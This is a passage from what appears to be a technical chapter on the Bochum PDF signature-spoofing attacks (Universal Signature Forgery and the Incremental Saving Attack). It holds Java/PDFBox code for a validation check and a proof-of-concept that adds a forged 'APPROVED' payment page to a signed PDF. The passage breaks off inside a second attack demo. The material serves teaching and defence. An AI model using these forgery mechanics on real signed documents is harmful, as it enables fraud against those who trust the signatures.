  \textbf{Prof. Dr. Jörg Schwenk} --- senior author on both papers,
  provided the research direction and the formal security model for PDF
  signatures
\end{itemize}

The team maintained a coordinated disclosure website at
\textbf{pdf-insecurity.org}, where they published proof-of-concept PDFs,
detailed attack descriptions, and a viewer-by-viewer vulnerability
matrix. Hackmanit GmbH later developed \textbf{PDF Detector}, a tool for
checking PDFs against known attack patterns.

The two landmark papers:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \emph{"1 Trillion Dollar Refund: How To Spoof PDF Signatures"} ---
  presented at \textbf{ACM Conference on Computer and Communications
  Security (CCS)}, November 2019, London. This paper introduced three
  attack classes (USF, ISA, SWA) and tested them against 22 desktop
  viewers and 7 online validation services.
\item
  \emph{"Shadow Attacks: Hiding and Replacing Content in Signed PDFs"}
  --- presented at \textbf{Network and Distributed Systems Security
  Symposium (NDSS)}, February 2021 (virtual). This paper introduced a
  fundamentally different attack model where malicious content is
  prepared \emph{before} the document is signed.
\end{enumerate}

Both conferences are top-tier academic venues in computer security. The
CCS 2019 paper won a \textbf{Distinguished Paper Award} --- a
recognition given to only a handful of papers at each conference.

\subsection{Before Bochum: The State of PDF Signature
Validation}\label{_before_bochum_the_state_of_pdf_signature_validation}

To understand why the Bochum attacks worked, you need to understand what
PDF viewers \emph{were} doing when they claimed to "validate" a
signature.

A correct signature validation must verify at least the following:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  \textbf{Structural integrity}: The byte range specified in the
  \texttt{/ByteRange} array must cover the entire file except the gap
  reserved for the \texttt{/Contents} value. There must be no
  unaccounted bytes before, between, or after the byte ranges.
\item
  \textbf{Cryptographic verification}: The CMS \texttt{SignedData}
  structure in \texttt{/Contents} must contain a valid signature over
  the hash of the byte range data. The digest algorithm, signing
  algorithm, and signed attributes must all be consistent.
\item
  \textbf{Certificate chain validation}: The signer's certificate must
  chain to a trusted root. The chain must be valid at the time of
  signing (or at the time of a trusted timestamp). Revocation status
  must be checked.
\item
  \textbf{Modification detection}: If additional data has been appended
  to the file after the signature (an incremental update), the viewer
  must determine whether those changes are permissible under the
  signature's \texttt{/TransformMethod} (e.g., DocMDP permission level)
  or whether they indicate tampering.
\end{enumerate}

What the Bochum team discovered was that most viewers implemented step 3
reasonably well (they checked certificate chains) but failed
catastrophically at steps 1, 2, and 4. Some viewers didn't check the
cryptographic signature value at all. Some didn't verify that the byte
range covered the entire file. Some allowed arbitrary changes after
signing without any warning.

The result: a perfectly executed certificate chain validation was
protecting\ldots\hspace{0pt} nothing. The viewers were carefully
verifying \emph{who} signed the document, while completely ignoring
\emph{whether the document had been changed since they signed it}.

\subsection{Attack Class 1: Universal Signature Forgery
(USF)}\label{_attack_class_1_universal_signature_forgery_usf}

\subsubsection{The Concept}\label{_the_concept}

Universal Signature Forgery is the simplest and most devastating of the
three original attack classes. The premise is almost embarrassingly
straightforward: what happens if the CMS signature value in
\texttt{/Contents} is wrong?

A correct implementation should reject the signature immediately --- if
the cryptographic value doesn't verify, nothing else matters. What the
Bochum team found was that some viewers never checked.

In the most extreme cases, the \texttt{/Contents} value could be empty
(all zeros), filled with random bytes, or contain a valid CMS structure
that signed completely different data --- and the viewer would still
display "Signature is valid" with a green checkmark.

\subsubsection{How It Works}\label{_how_it_works}

The attack requires no special tools and no knowledge of the signer's
private key. The attacker takes a legitimately signed PDF, modifies the
document content (changes text, replaces pages, adds content), and
re-calculates any internal structures (cross-reference table, object
offsets) needed to keep the file syntactically valid. The
\texttt{/Contents} value --- the CMS \texttt{SignedData} blob --- is
left unchanged, even though it now contains a signature over the
\emph{original} document bytes, not the modified ones.

In a correct implementation, the viewer would:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Read the \texttt{/ByteRange} to determine which bytes are signed
\item
  Hash those bytes using the digest algorithm specified in the CMS
  structure
\item
  Extract the signature value from the CMS \texttt{SignerInfo}
\item
  Verify the signature over the hash using the signer's public key
\item
  If verification fails → reject the signature
\end{enumerate}

Vulnerable viewers skipped step 4, step 3, or in some cases both. They
parsed the CMS structure to extract the signer's certificate (for
display purposes), checked that the certificate chained to a trust
anchor, and then displayed the result --- without ever verifying that
the signature value was mathematically valid for the current document
content.

\subsubsection{The Variants}\label{_the_variants}

The Bochum team identified three USF variants with increasing severity:

\textbf{USF Variant 1: Manipulated SignerInfo}

The \texttt{SignerInfo.signature} value (the actual RSASSA-PKCS1-v1\_5
or ECDSA bytes) is replaced with random data. A correct implementation
rejects this immediately during RSA/ECDSA verification. Vulnerable
viewers never reached that step.

\textbf{USF Variant 2: Manipulated ContentInfo}

The outer CMS \texttt{ContentInfo} wrapping is modified so the
\texttt{SignedData} structure is structurally invalid --- wrong OIDs,
missing fields, or inconsistent version numbers. A correct
implementation rejects this during CMS parsing. Vulnerable viewers used
lenient parsing that silently ignored structural errors.

\textbf{USF Variant 3: Manipulated \texttt{/Contents} Value}

The entire \texttt{/Contents} hex string is replaced --- either with
zeros, with a truncated CMS structure, or with a CMS structure copied
from a different document. This tests whether the viewer checks the
relationship between the CMS content and the actual document bytes at
all.

\subsubsection{Demonstration: Detecting USF
Vulnerability}\label{_demonstration_detecting_usf_vulnerability}

The following code demonstrates how to detect whether a signed PDF's CMS
signature actually validates cryptographically --- the check that
USF-vulnerable viewers failed to perform. This is the \emph{defense},
not the attack: if you are building a validator, this is the minimum you
must implement.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{Loader}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDDocument}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{interactive}\OperatorTok{.}\ImportTok{digitalsignature}\OperatorTok{.}\ImportTok{PDSignature}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cert}\OperatorTok{.}\ImportTok{X509CertificateHolder}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cert}\OperatorTok{.}\ImportTok{jcajce}\OperatorTok{.}\ImportTok{JcaX509CertificateConverter}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cms}\OperatorTok{.}\ImportTok{CMSProcessableByteArray}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cms}\OperatorTok{.}\ImportTok{CMSSignedData}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cms}\OperatorTok{.}\ImportTok{SignerInformation}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{cms}\OperatorTok{.}\ImportTok{jcajce}\OperatorTok{.}\ImportTok{JcaSimpleSignerInfoVerifierBuilder}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{jce}\OperatorTok{.}\ImportTok{provider}\OperatorTok{.}\ImportTok{BouncyCastleProvider}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{bouncycastle}\OperatorTok{.}\ImportTok{util}\OperatorTok{.}\ImportTok{Store}\OperatorTok{;}

\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{FileInputStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{InputStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{security}\OperatorTok{.}\ImportTok{Security}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{security}\OperatorTok{.}\ImportTok{cert}\OperatorTok{.}\ImportTok{X509Certificate}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{util}\OperatorTok{.}\ImportTok{Collection}\OperatorTok{;}

\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Demonstrates the cryptographic signature verification that USF}\CommentTok{{-}}\NormalTok{vulnerable}
 \CommentTok{*}\NormalTok{ viewers failed to perform}\CommentTok{. }\NormalTok{This is the MINIMUM check for signature integrity}\CommentTok{.}
 \CommentTok{*/}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ UsfDefenseCheck }\OperatorTok{\{}

    \DataTypeTok{static} \OperatorTok{\{}
        \BuiltInTok{Security}\OperatorTok{.}\FunctionTok{addProvider}\OperatorTok{(}\KeywordTok{new} \FunctionTok{BouncyCastleProvider}\OperatorTok{());}
    \OperatorTok{\}}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{verifySignature}\OperatorTok{(}\DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ pdfBytes}\OperatorTok{)} \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}
\NormalTok{        PDDocument doc }\OperatorTok{=}\NormalTok{ Loader}\OperatorTok{.}\FunctionTok{loadPDF}\OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{);}

        \ControlFlowTok{for} \OperatorTok{(}\NormalTok{PDSignature sig }\OperatorTok{:}\NormalTok{ doc}\OperatorTok{.}\FunctionTok{getSignatureDictionaries}\OperatorTok{())} \OperatorTok{\{}
            \CommentTok{// Step 1: Extract the signed byte ranges}
            \DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ signedContent }\OperatorTok{=}\NormalTok{ sig}\OperatorTok{.}\FunctionTok{getSignedContent}\OperatorTok{(}
                    \KeywordTok{new} \BuiltInTok{ByteArrayInputStream}\OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{));} 

            \CommentTok{// Step 2: Extract the CMS SignedData from /Contents}
            \DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ cmsBytes }\OperatorTok{=}\NormalTok{ sig}\OperatorTok{.}\FunctionTok{getContents}\OperatorTok{(}
                    \KeywordTok{new} \BuiltInTok{ByteArrayInputStream}\OperatorTok{(}\NormalTok{pdfBytes}\OperatorTok{));} 

            \CommentTok{// Step 3: Parse the CMS structure}
\NormalTok{            CMSSignedData cmsSignedData }\OperatorTok{=} \KeywordTok{new} \FunctionTok{CMSSignedData}\OperatorTok{(}
                    \KeywordTok{new} \FunctionTok{CMSProcessableByteArray}\OperatorTok{(}\NormalTok{signedContent}\OperatorTok{),}
\NormalTok{                    cmsBytes}\OperatorTok{);} 

            \CommentTok{// Step 4: Verify each signer\textquotesingle{}s cryptographic signature}
\NormalTok{            Store}\OperatorTok{\textless{}}\NormalTok{X509CertificateHolder}\OperatorTok{\textgreater{}}\NormalTok{ certStore }\OperatorTok{=}
\NormalTok{                    cmsSignedData}\OperatorTok{.}\FunctionTok{getCertificates}\OperatorTok{();}

            \ControlFlowTok{for} \OperatorTok{(}\NormalTok{SignerInformation signer }\OperatorTok{:}
\NormalTok{                    cmsSignedData}\OperatorTok{.}\FunctionTok{getSignerInfos}\OperatorTok{().}\FunctionTok{getSigners}\OperatorTok{())} \OperatorTok{\{}

                \BuiltInTok{Collection}\OperatorTok{\textless{}}\NormalTok{X509CertificateHolder}\OperatorTok{\textgreater{}}\NormalTok{ matches }\OperatorTok{=}
\NormalTok{                        certStore}\OperatorTok{.}\FunctionTok{getMatches}\OperatorTok{(}\NormalTok{signer}\OperatorTok{.}\FunctionTok{getSID}\OperatorTok{());}

                \ControlFlowTok{if} \OperatorTok{(}\NormalTok{matches}\OperatorTok{.}\FunctionTok{isEmpty}\OperatorTok{())} \OperatorTok{\{}
                    \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                            \StringTok{"FAIL: No certificate found for signer"}\OperatorTok{);} 
                    \ControlFlowTok{continue}\OperatorTok{;}
                \OperatorTok{\}}

\NormalTok{                X509CertificateHolder certHolder }\OperatorTok{=}\NormalTok{ matches}\OperatorTok{.}\FunctionTok{iterator}\OperatorTok{().}\FunctionTok{next}\OperatorTok{();}
                \BuiltInTok{X509Certificate}\NormalTok{ cert }\OperatorTok{=} \KeywordTok{new} \FunctionTok{JcaX509CertificateConverter}\OperatorTok{()}
                        \OperatorTok{.}\FunctionTok{setProvider}\OperatorTok{(}\StringTok{"BC"}\OperatorTok{)}
                        \OperatorTok{.}\FunctionTok{getCertificate}\OperatorTok{(}\NormalTok{certHolder}\OperatorTok{);}

                \CommentTok{// THIS IS THE CHECK THAT USF{-}VULNERABLE VIEWERS SKIPPED}
                \DataTypeTok{boolean}\NormalTok{ cryptoValid }\OperatorTok{=}\NormalTok{ signer}\OperatorTok{.}\FunctionTok{verify}\OperatorTok{(}
                        \KeywordTok{new} \FunctionTok{JcaSimpleSignerInfoVerifierBuilder}\OperatorTok{()}
                                \OperatorTok{.}\FunctionTok{setProvider}\OperatorTok{(}\StringTok{"BC"}\OperatorTok{)}
                                \OperatorTok{.}\FunctionTok{build}\OperatorTok{(}\NormalTok{cert}\OperatorTok{));} 

                \ControlFlowTok{if} \OperatorTok{(!}\NormalTok{cryptoValid}\OperatorTok{)} \OperatorTok{\{}
                    \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                            \StringTok{"FAIL: Cryptographic signature verification "}
                            \OperatorTok{+} \StringTok{"FAILED for signer: "} \OperatorTok{+}\NormalTok{ cert}\OperatorTok{.}\FunctionTok{getSubjectX500Principal}\OperatorTok{());}
                    \BuiltInTok{System}\OperatorTok{.}\FunctionTok{err}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                            \StringTok{"This document may have been tampered with (USF attack)"}\OperatorTok{);}
                \OperatorTok{\}} \ControlFlowTok{else} \OperatorTok{\{}
                    \BuiltInTok{System}\OperatorTok{.}\FunctionTok{out}\OperatorTok{.}\FunctionTok{println}\OperatorTok{(}
                            \StringTok{"PASS: Cryptographic signature valid for: "}
                            \OperatorTok{+}\NormalTok{ cert}\OperatorTok{.}\FunctionTok{getSubjectX500Principal}\OperatorTok{());}
                \OperatorTok{\}}
            \OperatorTok{\}}
        \OperatorTok{\}}

\NormalTok{        doc}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\item
  Extracts the bytes covered by \texttt{/ByteRange} --- this is the data
  that was supposedly signed
\item
  Extracts the raw CMS \texttt{SignedData} blob from the
  \texttt{/Contents} hex string
\item
  Creates a CMS structure with the signed content as the detached data
  --- BouncyCastle will use this for digest comparison
\item
  If no certificate matches the \texttt{SignerInfo.sid}, the CMS
  structure is malformed --- reject immediately
\item
  \textbf{This is the critical line.} \texttt{signer.verify()} performs
  the actual RSA/ECDSA verification: it computes the digest over the
  signed content, verifies the signed attributes, and checks the
  signature value against the signer's public key. USF-vulnerable
  viewers never called the equivalent of this method.
\end{itemize}

If your signature validation code does not include a step equivalent to
\texttt{signer.verify()} --- an actual cryptographic verification of the
signature value against the document bytes --- your code is vulnerable
to Universal Signature Forgery. This is non-negotiable. It must happen
before you display any "valid" indicator to the user.

\subsubsection{Constructing a USF Attack (Proof of
Concept)}\label{_constructing_a_usf_attack_proof_of_concept}

To understand USF fully, here is how an attacker constructs one. This is
\emph{not} production exploit code --- it is a minimal demonstration of
the mechanics that every PDF signature validator must defend against.

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{Loader}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDDocument}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDPage}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDPageContentStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{font}\OperatorTok{.}\ImportTok{PDType1Font}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{font}\OperatorTok{.}\ImportTok{Standard14Fonts}\OperatorTok{;}

\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{ByteArrayOutputStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{File}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{nio}\OperatorTok{.}\ImportTok{file}\OperatorTok{.}\ImportTok{Files}\OperatorTok{;}

\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Demonstrates USF attack mechanics}\CommentTok{. }\NormalTok{Takes a signed PDF}\CommentTok{,}\NormalTok{ modifies the visible}
 \CommentTok{*}\NormalTok{ content}\CommentTok{,}\NormalTok{ and writes the result}\CommentTok{.}\NormalTok{ The CMS signature value is left unchanged }\CommentTok{{-}{-}}
 \CommentTok{*}\NormalTok{ it now signs the ORIGINAL content}\CommentTok{,}\NormalTok{ not the modified content}\CommentTok{.}
 \CommentTok{*}
 \CommentTok{*}\NormalTok{ A correct validator will reject this because the digest over the byte range}
 \CommentTok{*}\NormalTok{ no longer matches the digest in the CMS SignerInfo}\CommentTok{.}
 \CommentTok{*}\NormalTok{ A USF}\CommentTok{{-}}\NormalTok{vulnerable validator will show }\CommentTok{"}\NormalTok{Signature is valid}\CommentTok{."}
 \CommentTok{*/}
\KeywordTok{public} \KeywordTok{class}\NormalTok{ UsfAttackDemo }\OperatorTok{\{}

    \KeywordTok{public} \DataTypeTok{static} \DataTypeTok{void} \FunctionTok{main}\OperatorTok{(}\BuiltInTok{String}\OperatorTok{[]}\NormalTok{ args}\OperatorTok{)} \KeywordTok{throws} \BuiltInTok{Exception} \OperatorTok{\{}
        \DataTypeTok{byte}\OperatorTok{[]}\NormalTok{ originalPdf }\OperatorTok{=}\NormalTok{ Files}\OperatorTok{.}\FunctionTok{readAllBytes}\OperatorTok{(}
                \KeywordTok{new} \BuiltInTok{File}\OperatorTok{(}\StringTok{"signed{-}document.pdf"}\OperatorTok{).}\FunctionTok{toPath}\OperatorTok{());}

        \CommentTok{// Load the signed PDF}
\NormalTok{        PDDocument doc }\OperatorTok{=}\NormalTok{ Loader}\OperatorTok{.}\FunctionTok{loadPDF}\OperatorTok{(}\NormalTok{originalPdf}\OperatorTok{);}

        \CommentTok{// Add a new page with attacker{-}controlled content}
\NormalTok{        PDPage attackPage }\OperatorTok{=} \KeywordTok{new} \FunctionTok{PDPage}\OperatorTok{();}
\NormalTok{        doc}\OperatorTok{.}\FunctionTok{addPage}\OperatorTok{(}\NormalTok{attackPage}\OperatorTok{);} 

\NormalTok{        PDPageContentStream cs }\OperatorTok{=} \KeywordTok{new} \FunctionTok{PDPageContentStream}\OperatorTok{(}\NormalTok{doc}\OperatorTok{,}\NormalTok{ attackPage}\OperatorTok{);}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{beginText}\OperatorTok{();}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{setFont}\OperatorTok{(}
                \KeywordTok{new} \FunctionTok{PDType1Font}\OperatorTok{(}\NormalTok{Standard14Fonts}\OperatorTok{.}\FunctionTok{FontName}\OperatorTok{.}\FunctionTok{HELVETICA\_BOLD}\OperatorTok{),} \DecValTok{24}\OperatorTok{);}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{newLineAtOffset}\OperatorTok{(}\DecValTok{50}\OperatorTok{,} \DecValTok{700}\OperatorTok{);}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{showText}\OperatorTok{(}\StringTok{"APPROVED {-} Payment of $1,000,000 authorized"}\OperatorTok{);} 
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{endText}\OperatorTok{();}
\NormalTok{        cs}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}

        \CommentTok{// Save with full rewrite — this changes object offsets,}
        \CommentTok{// xref table, and file length. The /ByteRange in the original}
        \CommentTok{// signature now covers different bytes, but the /Contents}
        \CommentTok{// CMS value still contains the hash of the ORIGINAL bytes.}
        \BuiltInTok{ByteArrayOutputStream}\NormalTok{ baos }\OperatorTok{=} \KeywordTok{new} \BuiltInTok{ByteArrayOutputStream}\OperatorTok{();}
\NormalTok{        doc}\OperatorTok{.}\FunctionTok{save}\OperatorTok{(}\NormalTok{baos}\OperatorTok{);} 
\NormalTok{        doc}\OperatorTok{.}\FunctionTok{close}\OperatorTok{();}

\NormalTok{        Files}\OperatorTok{.}\FunctionTok{write}\OperatorTok{(}
                \KeywordTok{new} \BuiltInTok{File}\OperatorTok{(}\StringTok{"usf{-}attack{-}result.pdf"}\OperatorTok{).}\FunctionTok{toPath}\OperatorTok{(),}\NormalTok{ baos}\OperatorTok{.}\FunctionTok{toByteArray}\OperatorTok{());}

        \CommentTok{// A correct validator: REJECTS (digest mismatch)}
        \CommentTok{// A USF{-}vulnerable validator: shows green checkmark}
    \OperatorTok{\}}
\OperatorTok{\}}
\end{Highlighting}
\end{Shaded}

\begin{itemize}
\item
  Modifying the document structure after it was signed --- adding a
  page, changing text, anything
\item
  The attacker can insert any content they want
\item
  A full \texttt{save()} (not \texttt{saveIncremental()}) rewrites the
  entire file, changing byte offsets everywhere. The original
  \texttt{/ByteRange} and \texttt{/Contents} are preserved structurally,
  but the bytes they reference have changed. The CMS signature now signs
  data that no longer exists at those byte positions.
\end{itemize}

This code produces a PDF that any \emph{correct} validator will reject.
The point is that in 2019, most validators were not correct. The digest
computed over the new byte range content will not match the digest
inside the CMS \texttt{SignerInfo.digestAlgorithm} --- the very first
check in proper CMS verification detects this. USF worked because
viewers displayed the signer's certificate information \emph{without
performing this check}.

\subsection{Attack Class 2: Incremental Saving Attack
(ISA)}\label{_attack_class_2_incremental_saving_attack_isa}

\subsubsection{The Concept}\label{_the_concept_2}

The Incremental Saving Attack is more subtle than USF and exploits a
feature that is fundamental to how PDF signatures work:
\textbf{incremental updates}.

When a PDF is signed, the signing process:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Appends the signature dictionary and any new objects to the end of the
  file
\item
  Appends a new cross-reference section pointing to the new/modified
  objects
\item
  Appends a new trailer
\item
  The \texttt{/ByteRange} in the signature covers everything from the
  beginning of the file through the end of this new revision --- with a
  gap for the \texttt{/Contents} value
\end{enumerate}

The critical insight is that PDF is designed to allow \emph{additional}
incremental updates after signing. This is intentional --- you need to
be able to add a second signature to an already-signed document, or fill
in form fields on a signed form. ISO 32000-2:2020 §12.8.1 explicitly
allows certain modifications after signing, depending on the signature's
\texttt{/TransformMethod} and permission level.

The question is: does the viewer correctly distinguish between
\emph{permissible} incremental updates (adding another signature) and
\emph{impermissible} ones (changing the page content)?

The Bochum team found that most viewers did not.

\subsubsection{How It Works}\label{_how_it_works_2}

The attacker takes a legitimately signed PDF and appends a new
incremental update --- exactly the way PDFBox's
\texttt{saveIncremental()} method does. But instead of adding a second
signature or filling in a form field, the attacker appends objects that
change the visible content: modified page content streams, replaced
images, rewritten text, or entirely new pages.

The original signature remains intact --- its byte range still covers
the original revision, and its CMS signature is still mathematically
valid over those bytes. The appended revision contains the
modifications, complete with a new cross-reference section and trailer
that redirect the viewer to the modified objects.

A correct validator must:

\begin{enumerate}
\def\labelenumi{\arabic{enumi}.}
\item
  Verify the signature is cryptographically valid (steps from USF
  defense)
\item
  Determine the document's revision at the time of signing (the byte
  range endpoint)
\item
  Compare the current document state to the signed revision
\item
  If there are changes beyond the signed revision, evaluate whether
  those changes are permissible under the signature's DocMDP permissions
\item
  If impermissible changes are detected, display a clear warning: "The
  document has been modified after signing"
\end{enumerate}

Vulnerable viewers either:

\begin{itemize}
\item
  Did not compare the current document state to the signed revision at
  all
\item
  Compared but accepted all incremental updates as permissible
\item
  Only checked whether the appended data was "syntactically valid PDF"
  rather than whether it changed the visible content
\end{itemize}

\subsubsection{The Variants}\label{_the_variants_2}

\textbf{ISA Variant 1: Content Replacement via Incremental Update}

The attacker appends a new revision that redefines existing page content
stream objects. The cross-reference in the new revision points to new
objects at the end of the file that replace the original content. The
viewer renders the new content; the signature covers the old content.

\textbf{ISA Variant 2: Page Insertion/Deletion}

The attacker appends a new revision that modifies the page tree ---
adding new pages, removing existing pages, or reordering them. The
\texttt{/Pages} dictionary in the new revision points to a different set
of page objects.

\textbf{ISA Variant 3: Annotation and Form Field Manipulation}

The attacker appends annotations or modifies form field values. This
variant is particularly insidious because some annotation changes
\emph{are} legitimately allowed after signing (e.g., adding signature
fields for subsequent signers). The boundary between "allowed" and "not
allowed" is defined by the DocMDP permission level, and most viewers did
not enforce it correctly.

\subsubsection{Demonstration: ISA Attack
Mechanics}\label{_demonstration_isa_attack_mechanics}

\begin{Shaded}
\begin{Highlighting}[]
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{Loader}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{cos}\OperatorTok{.}\ImportTok{COSDictionary}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{cos}\OperatorTok{.}\ImportTok{COSName}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{cos}\OperatorTok{.}\ImportTok{COSArray}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDDocument}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDPage}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{PDPageContentStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{common}\OperatorTok{.}\ImportTok{PDRectangle}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{font}\OperatorTok{.}\ImportTok{PDType1Font}\OperatorTok{;}
\KeywordTok{import} \ImportTok{org}\OperatorTok{.}\ImportTok{apache}\OperatorTok{.}\ImportTok{pdfbox}\OperatorTok{.}\ImportTok{pdmodel}\OperatorTok{.}\ImportTok{font}\OperatorTok{.}\ImportTok{Standard14Fonts}\OperatorTok{;}

\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{ByteArrayOutputStream}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{io}\OperatorTok{.}\ImportTok{File}\OperatorTok{;}
\KeywordTok{import} \ImportTok{java}\OperatorTok{.}\ImportTok{nio}\OperatorTok{.}\ImportTok{file}\OperatorTok{.}\ImportTok{Files}\OperatorTok{;}

\CommentTok{/**}
 \CommentTok{*}\NormalTok{ Demonstrates ISA mechanics}\CommentTok{. }\NormalTok{Takes a signed PDF and appends an incremental}
 \CommentTok{*}\NormalTok{ update that replaces the visible content of page }\CommentTok{1.}
 \CommentTok{*}
 \CommentTok{*}\NormalTok{ The original signature remains cryptographically valid over the original}
 \CommentTok{*}\NormalTok{ byte range}\CommentTok{.}\NormalTok{ The appended revision changes what the user sees}\CommentTok{.}
 \CommentTok{*}
 \CommentTok{*}\NormalTok{ A correct validator detects the impermissible modification}\CommentTok{.}
